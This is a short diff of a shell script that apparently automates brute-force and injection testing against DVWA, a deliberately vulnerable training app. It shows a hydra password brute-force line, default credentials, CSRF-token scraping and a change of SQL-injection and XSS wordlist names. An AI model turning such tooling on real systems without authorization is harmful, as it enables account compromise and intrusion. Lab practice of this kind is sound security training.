@@ -45,8 +45,10 @@ hydra -P $WORDLIST $TARGET http-get-form "/DVWA/vulnerabilities/sqli/:id=^PASS^&
 BASE_URL="http://$TARGET/DVWA"
 DVWA_USER="admin"
 DVWA_PASS="password"
-SQL_WORDLIST="SQL-Injection-100-Wordlist.txt"
-XSS_WORDLIST="XSS-100-Wordlist.txt"
+SQL_WORDLIST="SQL-Injection-Wordlist.txt"
+XSS_WORDLIST="XSS-Wordlist.txt"
+# SQL_WORDLIST="SQL-Injection-100-Wordlist.txt"
+# XSS_WORDLIST="XSS-100-Wordlist.txt"
 INIT_PAGE=$(curl -s "$BASE_URL/login.php")
 USER_TOKEN=$(echo "$INIT_PAGE" | grep -oP '(?<=name="user_token" value=")[^"]*')
 
